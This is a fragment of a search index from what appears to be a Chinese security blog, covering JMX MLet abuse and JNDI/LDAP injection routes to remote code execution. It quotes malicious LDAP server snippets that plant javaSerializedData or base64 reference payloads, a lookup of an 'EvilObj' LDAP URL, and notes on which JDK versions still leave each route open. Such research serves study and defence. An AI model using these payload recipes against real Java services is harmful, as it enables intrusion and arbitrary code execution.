\u91cd\u65b0 \u53d1\u8d77 \u8f7d\u5165 \u8bf7\u6c42 \uff0c \u610f\u5473 \u610f\u5473\u7740 \u4e00\u6b21 \u8f7d\u5165 \u6210\u529f \u4e4b\u540e \uff0c \u6211\u4eec \u5c31 \u53ef\u4ee5 \u76f4\u63a5 \u8c03\u7528 \u8be5 MBean \uff08 Server \u4e0d \u91cd\u542f \u7684 \u72b6\u6001 \u4e0b \uff09 \u3002   \u800c \u5bf9\u4e8e \u524d\u9762 \u63d0\u5230 \u7684 \u4e24\u4e2a \u5229\u7528 \u6761\u4ef6 \uff1a   \u5728 \u6587\u6863 \u91cc https : / / docs . oracle . com / javase / 7 / docs / technotes / guides / management / agent . html \u63d0\u5230   Caution   -   This   configuration   is   insecure :   any   remote   user   who   knows   ( or   guesses )   your   port   number   and   host   name   will   be   able   to   monitor   and   control   your   Java   applications   and   platform .   Furthermore ,   possible   harm   is   not   limited   to   the   operations   you   define   in   your   MBeans .   A   remote   client   could   create   a   javax . management . loading . MLet   MBean   and   use   it   to   create   new   MBeans   from   arbitrary   URLs ,   at   least   if   there   is   no   security   manager   .   In   other   words ,   a   rogue   remote   client   could   make   your   Java   application   execute   arbitrary   code .   Consequently ,   while   disabling   security   might   be   acceptable   for   development ,   it   is   strongly   recommended   that   you   do   not   disable   security   for   production   systems   .   \u9996\u5148 \u5bf9\u4e8e \u6709 \u8ba4\u8bc1 \u7684 \u60c5\u51b5 \u4e0b \uff0c \u8c03\u7528 MLet \u5c06\u4f1a \u8fdb\u884c \u6743 \u5f53\u524d \u7528\u6237 \u7684 \u6743\u9650 \u9a8c\u8bc1 \uff0c \u9ed8\u8ba4 \u60c5\u51b5 \u4e0b \u90fd \u662f \u4e0d \u5141\u8bb8 \u7684 \u3002   com / sun / jmx / remote / security / MBeanServerFileAccessController . java # checkAccess   \u4f1a \u68c0\u67e5 \u5f53\u524d \u767b\u9646 \u7684 \u7528\u6237 \u662f\u5426 \u6709 Create \u7684 \u6743\u9650 ( \u8fd9\u91cc \u7684 \u6743\u9650 \u662f \u4e0b\u9762 \u7684 createPatterns \uff0c \u5b83 \u5141\u8bb8 \u521b\u5efa \u6307\u5b9a \u6b63\u5219 \u7684 \u7c7b\u578b \uff0c \u800c \u6211\u4eec \u9ed8\u8ba4 \u662f \u4e3a \u7a7a \u7684 ) \uff0c \u8fd9\u91cc \u9ed8\u8ba4 \u4f1a \u8fd4\u56de false \uff0c \u4e5f \u5c31 \u610f\u5473 \u610f\u5473\u7740 \u5b83 \u4e0d \u5141\u8bb8 \u4ee5 MLet \u5bf9\u8c61 \u521b\u5efa \u65b0 \u7684 MBean   \u5176\u6b21 \u5bf9\u4e8e security   manager \u7684 \u9650\u5236 \uff0c \u5728 \u8fdc\u7a0b \u8f7d\u5165 \u524d\u4f1a \u5224\u65ad \u662f\u5426 \u5b58\u5728 \u8f7d\u5165 \u7684 \u6743\u9650 \uff08 \u8fd9\u91cc \u6211 \u6ca1 \u770b\u5230 \u5176\u4ed6 \u7684 \u5730\u65b9 \u505a \u4e86 \u5224\u65ad \uff0c \u53ef\u80fd \u4e0d\u6b62 \u5f53\u524d \u8fd9\u4e2a \u4f4d\u7f6e \u7684 \u9a8c\u8bc1 \uff09   \u5f53\u524d \u65b9\u6cd5 \u6bd4\u8f83 \u65b9\u4fbf \u7684 \u662f \u53ef\u4ee5 \u8f7d\u5165 \u4efb\u610f \u7684 \u4ee3\u7801 \u6765 \u6267\u884c \uff0c \u4f46\u662f \u5229\u7528 \u6761\u4ef6 \u6bd4\u8f83 \u82db\u523b \u3002","title":"3 .   \u5229\u7528 MLET \u65b9\u5f0f \u52a8\u6001 \u52a0\u8f7d MBean"},{"location":"blog/2020/java-jmx-rmi-20200310/#0x03","text":"\u5bf9\u4e8e JMX \u7684 \u5229\u7528 \u4e3b\u8981 \u5229\u7528 \u7684 \u662f \u672c\u5730 \u5b58\u5728 \u7684 Gadget \uff0c \u5982\u679c \u672c\u5730 \u4e0d \u5b58\u5728 Gadget \u7684\u8bdd \u5c31 \u65e0\u6cd5 \u5229\u7528 \u6210\u529f \u3002 \u9664\u975e \u6ee1\u8db3 JMX   MLet \u7684 \u5229\u7528 \u6761\u4ef6 \uff0c \u901a\u8fc7 \u52a0\u8f7d codebase \u4e0a \u7684 Jar \u6587\u4ef6 \u6765 \u6267\u884c \u4efb\u610f \u4ee3\u7801 \u3002   \u9664\u6b64 \u4e4b\u5916 \u9664\u6b64\u4e4b\u5916 \uff0c \u7531\u4e8e \u672c\u8eab JMX \u7528 \u7684 RMI \u90a3 \u4e00\u5957 \u4e1c\u897f \uff0c \u6240\u4ee5 \u5982\u679c \u5728 \u5408\u9002 \u7684 JDK \u7248\u672c \u4e0b \uff0c \u6211\u4eec \u53ef\u4ee5 \u76f4\u63a5 \u653b\u51fb RMI \uff0c \u4e0d\u8fc7 \u524d\u63d0 \u4ecd\u7136 \u662f \u672c\u5730 \u5b58\u5728 \u76f8\u5173 \u7684 \u5229\u7528 \u94fe \u3002   \u6700\u540e \uff0c \u524d \u6587 \u63d0\u5230 \u7684 \u653b\u51fb \u65b9\u6cd5 \u6211 \u5df2\u7ecf \u540c\u6b65 \u5230   github   \u4e0a \u4e86","title":"0x03   \u603b\u7ed3"},{"location":"blog/2020/jndi-with-ldap-20200301/","tags":["java"],"text":"0x00   \u524d\u8a00   JNDI \u7684 SPI \u5c42 \u9664\u4e86 RMI \u5916 \uff0c \u8fd8 \u53ef\u4ee5 \u8ddf LDAP \u4ea4\u4e92 \u3002 \u4e0e RMI \u7c7b\u4f3c \uff0c LDAP \u4e5f \u80fd \u540c\u6837 \u8fd4\u56de \u4e00\u4e2a Reference \u7ed9 JNDI \u7684 Naming   Manager \uff0c \u672c\u6587 \u5c06 \u8bb2\u8ff0 JNDI \u4f7f\u7528 ldap \u534f\u8bae \u7684 \u4e24\u4e2a \u653b\u51fb \u653b\u51fb\u9762 XD   0x01   LDAP \u57fa\u7840   \u5173\u4e8e LDAP \u7684 \u4ecb\u7ecd \uff0c \u5ef6\u4f38 \u9605\u8bfb \u4e00\u4e0b   \u8fd9\u7bc7   LDAP   can   be   used   to   store   Java   objects   by   using   several   special   Java   attributes .   There   are   at   least   two   ways   a   Java   object   can   be   represented   in   an   LDAP   directory :   \u25cf   Using   Java   serialization   o   https : / / docs . oracle . com / javase / jndi / tutorial / objects / storing / serial . html   \u25cf   Using   JNDI   References   o   https : / / docs . oracle . com / javase / jndi / tutorial / objects / storing / reference . html   from   https : / / www . blackhat . com / docs / us - 16 / materials / us - 16 - Munoz - A - Journey - From - JNDI - LDAP - Manipulation - To - RCE - wp . pdf   Java \u4e2d \u7684 LDAP \u53ef\u4ee5 \u5728 \u5c5e\u6027 \u503c\u4e2d \u5b58\u50a8 \u76f8\u5173 \u7684 Java \u5bf9\u8c61 \uff0c \u53ef\u4ee5 \u5b58\u50a8 \u5982 \u4e0a \u4e24\u79cd \u5bf9\u8c61 \uff0c \u800c \u76f8\u5173 \u7684 \u95ee\u9898 \u5c31\u662f \u51fa\u73b0 \u5728 \u8fd9\u90e8 \u90e8\u5206 \u8fd9\u90e8\u5206 \u4e0a \u3002   \u540e\u6587\u7528 \u7684 LDAP   Server \u53c2\u8003 \u7684 \u662f   mbechler   \u5b9e\u73b0 \u7684 LDAPRefServer   \uff0c \u8fde\u63a5 \u7684 \u5ba2\u6237 \u5ba2\u6237\u7aef Client \u76f4\u63a5 \u7528 JNDI \u7684 lookup \u5b8c\u6210 \uff0c jdk \u7248\u672c jdk8u162   Context   ctx   =   new   InitialContext   ( ) ;   ctx   .   lookup   (   \" ldap : / / 127.0 . 0.1 : 1389 / EvilObj \"   ) ;   ctx   .   close   ( ) ;   0x02   LDAP   with   JDNI   References   JNDI \u53d1\u8d77 ldap \u7684 lookup \u540e \uff0c \u5c06 \u6709 \u5982\u4e0b \u7684 \u8c03\u7528 \u6d41\u7a0b \uff0c \u8fd9\u91cc \u6211\u4eec \u76f4\u63a5 \u6765 \u5173\u6ce8 \uff0c \u83b7\u5f97 \u8fdc\u7a0b LDAP   Server \u7684 Entry \u4e4b\u540e \uff0c Client \u8fd9\u8fb9 \u662f \u600e\u4e48 \u505a \u5904\u7406 \u7684   \u8ddf\u8fdb com / sun / jndi / ldap / Obj . java # decodeObject \uff0c \u6309\u7167 \u8be5 \u51fd\u6570 \u7684 \u6ce8\u91ca \u6765\u770b \uff0c \u5176 \u4e3b\u8981 \u529f\u80fd \u662f \u89e3\u7801 \u4ece LDAP   Server \u6765 \u7684 \u5bf9\u8c61 \uff0c \u8be5 \u5bf9\u8c61 \u53ef\u80fd \u662f \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u5bf9\u8c61 \uff0c \u4e5f \u53ef\u80fd \u662f \u4e00\u4e2a Reference \u5bf9\u8c61 \u3002 \u5173\u4e8e \u5e8f\u5217 \u5e8f\u5217\u5316 \u5bf9\u8c61 \u7684 \u5904\u7406 \uff0c \u6211\u4eec \u770b \u540e\u9762 \u4e00\u8282 \u3002 \u8fd9\u91cc \u6458\u53d6 \u4e86 Reference \u7684 \u5904\u7406 \u65b9\u5f0f \uff1a   static   Object   decodeObject   (   Attributes   attrs   )   throws   NamingException   {   Attribute   attr   ;   / /   Get   codebase ,   which   is   used   in   all   3   cases .   String   [ ]   codebases   =   getCodebases   (   attrs   .   get   (   JAVA _ ATTRIBUTES   [   CODEBASE   ]   ) ) ;   try   {   / /   ...   attr   =   attrs   .   get   (   JAVA _ ATTRIBUTES   [   OBJECT _ CLASS   ]   ) ;   / /   \" objectClass \"   if   (   attr   ! =   null   &&   (   attr   .   contains   (   JAVA _ OBJECT _ CLASSES   [   REF _ OBJECT   ]   )   | |   / /   \" javaNamingReference \"   attr   .   contains   (   JAVA _ OBJECT _ CLASSES _ LOWER   [   REF _ OBJECT   ]   ) ) )   {   / /   \" javanamingreference \"   return   decodeReference   (   attrs   ,   codebases   ) ;   }   / / ...   \u5982\u679c LDAP   Server \u8fd4\u56de \u7684 \u5c5e\u6027 \u91cc \u5305\u62ec \u4e86   objectClass   \u548c   javaNamingReference   \uff0c \u5c06 \u8fdb\u5165 Reference \u7684 \u5904\u7406 \u51fd\u6570 \u5904\u7406\u51fd\u6570 decodeReference \u4e0a   if   ( (   attr   =   attrs   .   get   (   JAVA _ ATTRIBUTES   [   CLASSNAME   ]   ) )   ! =   null   )   {   className   =   (   String   )   attr   .   get   ( ) ;   }   else   {   throw   new   InvalidAttributesException   (   JAVA _ ATTRIBUTES   [   CLASSNAME   ]   +   \"   attribute   is   required \"   ) ;   }   if   ( (   attr   =   attrs   .   get   (   JAVA _ ATTRIBUTES   [   FACTORY   ]   ) )   ! =   null   )   {   factory   =   (   String   )   attr   .   get   ( ) ;   }   Reference   ref   =   new   Reference   (   className   ,   factory   ,   (   codebases   ! =   null   ?   codebases   [   0   ]   :   null   ) ) ;   decodeReference \u518d \u4ece\u5c5e \u5c5e\u6027 \u4ece\u5c5e\u6027 \u4e2d \u63d0\u53d6 \u51fa   javaClassName   \u548c   javaFactory   \uff0c \u6700\u540e \u5c06 \u751f\u6210 \u4e00\u4e2a Reference \u3002 \u8fd9\u91cc \u5982\u679c \u770b\u8fc7 \u6211 \u524d\u9762 \u7684 \u90a3 \u7bc7   jndi - with - rmi   \uff0c \u53ef\u4ee5 \u770b\u5230 \u5176\u5b9e \u8fd9\u91cc \u751f\u6210 \u7684 ref \u5c31\u662f \u6211\u4eec \u5728 RMI \u8fd4\u56de \u7684 \u90a3\u4e2a ReferenceWrapper \uff0c \u540e\u9762 \u8fd9\u4e2a ref \u5c06\u4f1a \u4f20\u9012 \u7ed9 Naming   Manager \u53bb \u5904\u7406 \uff0c \u5305\u62ec \u4ece codebase \u4e2d \u83b7\u53d6 class \u6587\u4ef6 \u5e76 \u8f7d\u5165 \u3002   \u800c \u8fd9\u91cc LDAP \u4e5f \u7c7b\u4f3c \uff0c \u5904\u7406 ref \u7684 \u5bf9\u8c61 \u662f NamingManager \u7684 \u5b50\u7c7b javax / naming / spi / DirectoryManager . java \uff0c \u56e0\u4e3a \u8ddf RMI \u6709\u70b9 \u7c7b\u4f3c \u4e0d \u5177\u4f53 \u5206\u6790 \u5177\u4f53\u5206\u6790 \u4e86 \uff0c \u6700\u540e \u540c\u6837 \u7531 javax / naming / spi / NamingManager . java # getObjectFactoryFromReference \u6765 \u5904\u7406 \u3002   \u5230 \u8fd9\u91cc \uff0c \u6211\u4eec \u518d \u6765\u770b mbechler   \u5b9e\u73b0 \u7684 LDAPRefServer \u5c31 \u6bd4\u8f83 \u6e05\u695a \u6bd4\u8f83\u6e05\u695a \u4e86   \u5f53\u5176 \u83b7\u53d6 \u5230 LDAP \u8fde\u63a5 \u65f6 \uff0c \u5c06 \u586b\u5145 \u5982\u4e0a \u7684 \u51e0\u4e2a \u5c5e\u6027 \u53ca\u5176 \u5bf9\u5e94 \u7684 \u503c \uff0c \u5c31\u662f \u4e3a\u4e86 \u6ee1\u8db3 \u4e0a\u9762 \u7684 \u6761\u4ef6 \u800c \u751f\u6210 \u4e00\u4e2a Reference \u5bf9\u8c61 \u3002   0x03   LDAP   with   Serialized   Object   JNDI \u5bf9\u4e8e \u5c5e\u6027 \u4e2d \u7684 \u5e8f\u5217 \u5e8f\u5217\u5316 \u6570\u636e \u7684 \u5904\u7406 \u4e00\u5171 \u6709 \u4e24\u4e2a \u5730\u65b9 \uff0c \u6211\u4eec \u5148 \u6765 \u987a\u7740 \u524d\u9762 \u7684 JNDI   Reference \u7684 \u601d\u8def \u8bf4 \u4e0b\u53bb   \u7b2c\u4e00 \u4e00\u5904 \u7b2c\u4e00\u5904 \uff1a com / sun / jndi / ldap / Obj . java # decodeObject   \u5728 com / sun / jndi / ldap / Obj . java # decodeObject \u4e0a \u8fd8 \u5b58\u5728 \u4e00\u4e2a \u5224\u65ad   if   ( (   attr   =   attrs   .   get   (   JAVA _ ATTRIBUTES   [   SERIALIZED _ DATA   ]   ) )   ! =   null   )   {   / /   \u201c javaSerializedData \u201d   ClassLoader   cl   =   helper   .   getURLClassLoader   (   codebases   ) ;   return   deserializeObject   ( (   byte   [ ]   )   attr   .   get   ( ) ,   cl   ) ;   }   \u5982\u679c \u5728 \u8fd4\u56de \u7684 \u5c5e\u6027 \u4e2d \u5b58\u5728   javaSerializedData   \uff0c \u5c06 \u7ee7\u7eed \u8c03\u7528   deserializeObject   \u51fd\u6570 \uff0c \u8be5 \u51fd\u6570 \u4e3b\u8981 \u5c31\u662f \u8c03\u7528 \u5e38\u89c4 \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u65b9\u5f0f readObject \u5bf9 \u5e8f\u5217 \u5e8f\u5217\u5316 \u6570\u636e \u8fdb\u884c \u8fd8\u539f \uff0c \u5982\u4e0b payload \u3002   @ Override   protected   void   processAttribute   (   Entry   entry   ) {   entry   .   addAttribute   (   \" javaClassName \"   ,   \" foo \"   ) ;   entry   .   addAttribute   (   \" javaSerializedData \"   ,   serialized   ) ;   }   \u8fd9\u91cc \u6211\u4eec \u5c31 \u4e0d \u9700\u8981 \u901a\u8fc7 \u8fdc\u7a0b codebase \u7684 \u65b9\u5f0f \u6765 \u8fbe\u6210 RCE \uff0c \u5f53\u7136 \u9996\u5148 \u672c\u5730 \u73af\u5883 \u4e0a \u9700\u8981 \u6709 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe\u6240 \u4f9d\u8d56 \u7684 \u5e93 \u6587\u4ef6 \u3002   \u7b2c\u4e8c \u4e8c\u5904 \u7b2c\u4e8c\u5904 \uff1a com / sun / jndi / ldap / Obj . java # decodeReference   decodeReference   \u51fd\u6570 \u5728 \u5bf9 \u666e\u901a \u7684 Reference \u8fd8\u539f \u7684 \u57fa\u7840 \u4e0a \uff0c \u8fd8 \u53ef\u4ee5 \u4e00\u6b65 \u8fdb\u4e00\u6b65 \u5bf9 RefAddress \u505a \u8fd8\u539f \u5904\u7406 \uff0c \u5176\u4e2d \u8fd8\u539f \u8fc7\u7a0b \u4e2d \uff0c \u4e5f \u8c03\u7528 \u4e86   deserializeObject   \u51fd\u6570 \uff0c \u8fd9 \u610f\u5473 \u610f\u5473\u7740 \u6211\u4eec \u901a\u8fc7 \u6ee1\u8db3 RefAddress \u7684 \u65b9\u5f0f \uff0c \u4e5f \u53ef\u4ee5 \u8fbe\u5230 \u4e0a\u9762 \u7b2c\u4e00 \u4e00\u79cd \u7b2c\u4e00\u79cd \u7684 \u6548\u679c \u3002   \u5177\u4f53 \u4ee3\u7801 \u592a\u957f \u4e86 \uff0c \u8fd9\u91cc \u6211 \u5c31 \u8bf4 \u4e00\u4e0b \u6761\u4ef6 \uff1a   \u7b2c\u4e00 \u4e00\u4e2a \u7b2c\u4e00\u4e2a \u5b57\u7b26 \u4e3a \u5206\u9694 \u5206\u9694\u7b26   \u7b2c\u4e00 \u4e00\u4e2a \u7b2c\u4e00\u4e2a \u5206\u9694 \u5206\u9694\u7b26 \u4e0e \u7b2c\u4e8c \u4e8c\u4e2a \u7b2c\u4e8c\u4e2a \u5206\u9694 \u5206\u9694\u7b26 \u4e4b\u95f4 \uff0c \u8868\u793a Reference \u7684 position \uff0c \u4e3a int \u7c7b\u578b   \u7b2c\u4e8c \u4e8c\u4e2a \u7b2c\u4e8c\u4e2a \u5206\u9694 \u5206\u9694\u7b26 \u4e0e \u7b2c\u4e09 \u4e09\u4e2a \u7b2c\u4e09\u4e2a \u5206\u9694 \u5206\u9694\u7b26 \u4e4b\u95f4 \uff0c \u8868\u793a type \uff0c \u7c7b\u578b   \u7b2c\u4e09 \u4e09\u4e2a \u7b2c\u4e09\u4e2a \u5206\u9694 \u5206\u9694\u7b26 \u662f \u53cc \u5206\u9694 \u5206\u9694\u7b26 \u7684 \u5f62\u5f0f \uff0c \u5219 \u8fdb\u5165 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u64cd\u4f5c   \u5e8f\u5217 \u5e8f\u5217\u5316 \u6570\u636e \u7528 base64 \u7f16\u7801   \u6ee1\u8db3 \u4e0a\u9762 \u7684 \u6761\u4ef6 \uff0c \u6784\u9020 \u4e00\u4e2a \u7c7b\u4f3c \u7684   protected   void   processAttribute   (   Entry   entry   ) {   entry   .   addAttribute   (   \" javaClassName \"   ,   \" foo \"   ) ;   entry   .   addAttribute   (   \" javaReferenceAddress \"   ,   \" $ 1 $ String $ $ \"   +   new   BASE64Encoder   ( ) .   encode   (   serialized   ) ) ;   entry   .   addAttribute   (   \" objectClass \"   ,   \" javaNamingReference \"   ) ;   / / $ NON - NLS - 1 $   }   \u5f53\u7136 \u7b2c\u4e8c \u4e8c\u5904 \u7b2c\u4e8c\u5904 \u53ea\u662f \u4e00\u4e2a \u9526\u4e0a\u6dfb\u82b1 \u7684 \u6b65\u9aa4 \uff0c \u6211\u4eec \u53ef\u4ee5 \u76f4\u63a5 \u7528 \u7b2c\u4e00 \u4e00\u79cd \u7b2c\u4e00\u79cd \u65b9\u6cd5 \uff0c \u7b2c\u4e8c \u4e8c\u79cd \u7b2c\u4e8c\u79cd \u5728 \u7b2c\u4e00 \u4e00\u79cd \u7b2c\u4e00\u79cd \u4e0d\u80fd \u7528 \u7684 \u60c5\u51b5 \u4e0b \u53ef\u4ee5 \u8bd5\u8bd5 \u3002   0x04   \u540e\u7eed   \u81ea   jdk8u191 - b02   \u7248\u672c \u540e \uff0c \u65b0 \u6dfb\u52a0 \u4e86   com . sun . jndi . ldap . object . trustURLCodebase   \u9ed8\u8ba4 \u4e3a false \u7684 \u9650\u5236 \uff0c \u4e5f \u5c31 \u610f\u5473 \u610f\u5473\u7740 \u8fdc\u7a0b codebase \u7684 Reference \u65b9\u5f0f \u88ab \u9650\u5236 \u6b7b \u4e86 \uff0c \u6211\u4eec \u53ea\u80fd \u901a\u8fc7 SerializedData \u7684 \u65b9\u6cd5 \u6765 \u8fbe\u6210 \u5229\u7528 \u3002   \u6211\u4eec \u6765 \u6574\u7406 \u4e00\u4e0b \uff0c \u5173\u4e8e jndi \u7684 \u76f8\u5173 \u5b89\u5168 \u66f4\u65b0 \u5b89\u5168\u66f4\u65b0   JDK   6u132 ,   JDK   7u122 ,   JDK   8u113 \u4e2d \u6dfb\u52a0 \u4e86 com . sun . jndi . rmi . object . trustURLCodebase \u3001 com . sun . jndi . cosnaming . object . trustURLCodebase   \u7684 \u9ed8\u8ba4 \u9ed8\u8ba4\u503c \u53d8\u4e3a false \u3002   \u5bfc\u81f4 jndi \u7684 rmi   reference \u65b9\u5f0f \u5931\u6548 \uff0c \u4f46 ldap \u7684 reference \u65b9\u5f0f \u4ecd\u7136 \u53ef\u884c   Oracle   JDK   11.0 . 1 \u3001 8u191 \u3001 7u201 \u3001 6u211 \u4e4b\u540e   com . sun . jndi . ldap . object . trustURLCodebase   \u5c5e\u6027 \u7684 \u9ed8\u8ba4 \u9ed8\u8ba4\u503c \u88ab \u8c03\u6574 \u4e3a false \u3002   \u5bfc\u81f4 jndi \u7684 ldap   reference \u65b9\u5f0f \u5931\u6548 \uff0c \u5230 \u8fd9\u91cc \u4e3a\u6b62 \uff0c \u8fdc\u7a0b codebase \u7684 \u65b9\u5f0f \u57fa\u672c \u5931\u6548 \uff0c \u9664\u975e \u8ba4\u4e3a \u8bbe\u4e3a true   \u800c \u5728 \u6700\u65b0 \u65b0\u7248 \u6700\u65b0\u7248 \u7684 jdk8u \u4e0a \uff0c jndi   ldap \u7684 \u672c\u5730 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe   1   \u548c   2   \u7684 \u65b9\u5f0f \u4ecd\u7136 \u672a \u5931\u6548 \uff0c jndi   rmi \u5e95\u5c42 ( JRMPListener )   StreamRemoteCall   \u7684 \u672c\u5730 \u5229\u7528 \u65b9\u5f0f \u4ecd \u672a \u5931\u6548 \u3002   \u6240\u4ee5 \u5982\u679c Reference \u7684 \u65b9\u5f0f \u4e0d\u884c \u7684 \u65f6\u5019 \uff0c \u53ef\u4ee5 \u8bd5\u8bd5 \u5229\u7528 \u672c\u5730 ClassPath \u91cc \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe\u6765 \u8fbe\u6210 RCE \u3002   0x05   \u603b\u7ed3   JNDI \u548c LDAP \u7684 \u7ed3\u5408 \uff0c \u51fa\u73b0 \u4e86 2 \u79cd \u5229\u7528 \u65b9\u5f0f \uff0c \u4e00\u662f \u5229\u7528 \u8fdc\u7a0b codebase \u7684 \u65b9\u5f0f \uff0c \u4e8c\u662f \u5229\u7528 \u672c\u5730 ClassPath \u91cc \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u3002 \u5728 \u6700\u65b0 \u65b0\u7248 \u6700\u65b0\u7248 \u7684 jdk8u \u4e2d \uff0c codebase \u7684 \u65b9\u5f0f \u4f9d\u8d56   com . sun . jndi . ldap . object . trustURLCodebase   \u7684 \u503c \uff0c \u800c \u7b2c\u4e8c \u4e8c\u79cd \u7b2c\u4e8c\u79cd \u65b9\u5f0f \u4ecd \u672a \u5931\u6548 \u3002   LDAP \u7684 \u4f7f\u7528 \u65b9\u6cd5 \u9664\u4e86 JNDI \u7684 lookup \uff0c \u5176\u4ed6 \u7684 \u5e93 \u4e5f \u4f1a \u6709 \u76f8\u5e94 \u7684 \u4f7f\u7528 \u65b9\u6cd5 \uff0c \u5982 Spring \u7684 ldap \uff0c \u8fd9\u91cc \u8fd8 \u53ef\u4ee5 \u7ee7\u7eed \u6df1\u5165 \u4e0b\u53bb \uff0c \u5148 \u6316\u4e2a \u5751 XD   \u6700\u540e \uff0c \u4e0a\u9762 \u7684 \u4e24\u4e2a ldap   Server \u66f4\u65b0 \u5230 \u4e86   github   \u4e0a \uff0c \u81ea\u53d6 XD","title":"JNDI   with   LDAP"},{"location":"blog/2020/jndi-with-ldap-20200301/#0x00","text":"JNDI \u7684 SPI \u5c42 \u9664\u4e86 RMI \u5916 \uff0c \u8fd8 \u53ef\u4ee5 \u8ddf LDAP \u4ea4\u4e92 \u3002 \u4e0e RMI \u7c7b\u4f3c \uff0c LDAP \u4e5f \u80fd \u540c\u6837 \u8fd4\u56de \u4e00\u4e2a Reference \u7ed9 JNDI \u7684 Naming   Manager \uff0c \u672c\u6587 \u5c06 \u8bb2\u8ff0 JNDI \u4f7f\u7528 ldap \u534f\u8bae \u7684 \u4e24\u4e2a \u653b\u51fb \u653b\u51fb\u9762 XD","title":"0x00   \u524d\u8a00"},{"location":"blog/2020/jndi-with-ldap-20200301/#0x01-ldap","text":"\u5173\u4e8e LDAP \u7684 \u4ecb\u7ecd \uff0c \u5ef6\u4f38 \u9605\u8bfb \u4e00\u4e0b   \u8fd9\u7bc7   LDAP   can   be   used   to   store   Java   objects   by   using   several   special   Java   attributes .   There   are   at   least   two   ways   a   Java   object   can   be   represented   in   an   LDAP   directory :   \u25cf   Using   Java   serialization   o   https : / / docs . oracle . com / javase / jndi / tutorial / objects / storing / serial . html   \u25cf   Using   JNDI   References   o   https : / / docs . oracle . com / javase / jndi / tutorial / objects / storing / reference . html   from   https : / / www . blackhat . com / docs / us - 16 / materials / us - 16 - Munoz - A - Journey - From - JNDI - LDAP - Manipulation - To - RCE - wp . pdf   Java \u4e2d \u7684 LDAP \u53ef\u4ee5 \u5728 \u5c5e\u6027 \u503c\u4e2d \u5b58\u50a8 \u76f8\u5173 \u7684 Java \u5bf9\u8c61 \uff0c \u53ef\u4ee5 \u5b58\u50a8 \u5982 \u4e0a \u4e24\u79cd \u5bf9\u8c61 \uff0c \u800c \u76f8\u5173 \u7684 \u95ee\u9898 \u5c31\u662f \u51fa\u73b0 \u5728 \u8fd9\u90e8 \u90e8\u5206 \u8fd9\u90e8\u5206 \u4e0a \u3002   \u540e\u6587\u7528 \u7684 LDAP   Server \u53c2\u8003 \u7684 \u662f   mbechler   \u5b9e\u73b0 \u7684 LDAPRefServer   \uff0c \u8fde\u63a5 \u7684 \u5ba2\u6237 \u5ba2\u6237\u7aef Client \u76f4\u63a5 \u7528 JNDI \u7684 lookup \u5b8c\u6210 \uff0c jdk \u7248\u672c jdk8u162   Context   ctx   =   new   InitialContext   ( ) ;   ctx   .   lookup   (   \" ldap : / / 127.0 . 0.1 : 1389 / EvilObj \"   ) ;   ctx   .   close   ( ) ;","title":"0x01   LDAP \u57fa\u7840"},{"location":"blog/2020/jndi-with-ldap-20200301/#0x02-ldap-with-jdni-references","text":"JNDI \u53d1\u8d77 ldap \u7684 lookup \u540e \uff0c \u5c06 \u6709 \u5982\u4e0b \u7684 \u8c03\u7528 \u6d41\u7a0b \uff0c \u8fd9\u91cc \u6211\u4eec \u76f4\u63a5 \u6765 \u5173\u6ce8 \uff0c \u83b7\u5f97 \u8fdc\u7a0b LDAP   Server \u7684 Entry \u4e4b\u540e \uff0c Client \u8fd9\u8fb9 \u662f \u600e\u4e48 \u505a \u5904\u7406 \u7684   \u8ddf\u8fdb com / sun / jndi / ldap / Obj . java # decodeObject \uff0c \u6309\u7167 \u8be5 \u51fd\u6570 \u7684 \u6ce8\u91ca \u6765\u770b \uff0c \u5176 \u4e3b\u8981 \u529f\u80fd \u662f \u89e3\u7801 \u4ece LDAP   Server \u6765 \u7684 \u5bf9\u8c61 \uff0c \u8be5 \u5bf9\u8c61 \u53ef\u80fd \u662f \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u5bf9\u8c61 \uff0c \u4e5f \u53ef\u80fd \u662f \u4e00\u4e2a Reference \u5bf9\u8c61 \u3002 \u5173\u4e8e \u5e8f\u5217 \u5e8f\u5217\u5316 \u5bf9\u8c61 \u7684 \u5904\u7406 \uff0c \u6211\u4eec \u770b \u540e\u9762 \u4e00\u8282 \u3002 \u8fd9\u91cc \u6458\u53d6 \u4e86 Reference \u7684 \u5904\u7406 \u65b9\u5f0f \uff1a   static   Object   decodeObject   (   Attributes   attrs   )   throws   NamingException   {   Attribute   attr   ;   / /   Get   codebase ,   which   is   used   in   all   3   cases .   String   [ ]   codebases   =   getCodebases   (   attrs   .   get   (   JAVA _ ATTRIBUTES   [   CODEBASE   ]   ) ) ;   try   {   / /   ...   attr   =   attrs   .   get   (   JAVA _ ATTRIBUTES   [   OBJECT _ CLASS   ]   ) ;   / /   \" objectClass \"   if   (   attr   ! =   null   &&   (   attr   .   contains   (   JAVA _ OBJECT _ CLASSES   [   REF _ OBJECT   ]   )   | |   / /   \" javaNamingReference \"   attr   .   contains   (   JAVA _ OBJECT _ CLASSES _ LOWER   [   REF _ OBJECT   ]   ) ) )   {   / /   \" javanamingreference \"   return   decodeReference   (   attrs   ,   codebases   ) ;   }   / / ...   \u5982\u679c LDAP   Server \u8fd4\u56de \u7684 \u5c5e\u6027 \u91cc \u5305\u62ec \u4e86   objectClass   \u548c   javaNamingReference   \uff0c \u5c06 \u8fdb\u5165 Reference \u7684 \u5904\u7406 \u51fd\u6570 \u5904\u7406\u51fd\u6570 decodeReference \u4e0a   if   ( (   attr   =   attrs   .   get   (   JAVA _ ATTRIBUTES   [   CLASSNAME   ]   ) )   ! =   null   )   {   className   =   (   String   )   attr   .   get   ( ) ;   }   else   {   throw   new   InvalidAttributesException   (   JAVA _ ATTRIBUTES   [   CLASSNAME   ]   +   \"   attribute   is   required \"   ) ;   }   if   ( (   attr   =   attrs   .   get   (   JAVA _ ATTRIBUTES   [   FACTORY   ]   ) )   ! =   null   )   {   factory   =   (   String   )   attr   .   get   ( ) ;   }   Reference   ref   =   new   Reference   (   className   ,   factory   ,   (   codebases   ! =   null   ?   codebases   [   0   ]   :   null   ) ) ;   decodeReference \u518d \u4ece\u5c5e \u5c5e\u6027 